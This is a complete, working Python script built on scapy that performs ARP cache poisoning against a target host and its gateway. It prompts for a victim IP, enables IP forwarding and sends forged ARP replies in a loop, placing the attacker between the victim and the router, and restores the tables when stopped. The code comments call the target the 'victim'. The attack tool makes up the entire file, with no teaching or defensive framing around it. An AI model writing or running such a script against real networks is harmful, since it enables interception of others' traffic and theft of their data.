import time, scapy, threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

def attack_start():
    target_IP = input ("Input target IP address: ")

    target_mac = get_mac(target_IP)

    gateway_ip = get_gateway()

    gateway_mac = get_mac(gateway_ip)

    arp_poison(target_IP, gateway_ip, target_mac, gateway_mac)



def arp_poison(target_IP, gateway_ip, target_mac, gateway_mac):
    packet_forward() # Call function to enable packet forwarding
    print("Starting ARP Poisoning")
    try:
        while 1:
            send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwdst = target_mac)) #ARP reply, change MAC on target device, from router to source
            send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwdst = gateway_mac)) #ARP reply, change MAC on router, from source to router
            time.sleep(5)
    except KeyboardInterrupt:
        restore_session(target_IP, gateway_ip, target_mac, gateway_mac)
        print("Stopping")

#Get MAC address of victim's machine
def get_mac(target_IP):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP (pdst=target_IP), timeout=2, retry = 10) #Specified the broadcast MAC address
    for sent, rcv in ans:
        return rcv.hwsrc

#Enable packet forwarding so victim's traffic will continue
def packet_forward():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#Get gateway IP address
def get_gateway():
    gateway_ip = conf.route.route("0.0.0.0")[2] #Wildcard to define default routing address, [2] specifies the router IP in the tuple
    return gateway_ip

#Restore ARP tables of target and router
def restore_session(target_IP, gateway_ip, target_mac, gateway_mac):
    send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwsrc = target_mac)) #tell router, victims real MAC
    send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwsrc = gateway_mac)) #tell victim, routers real MAC

















#main()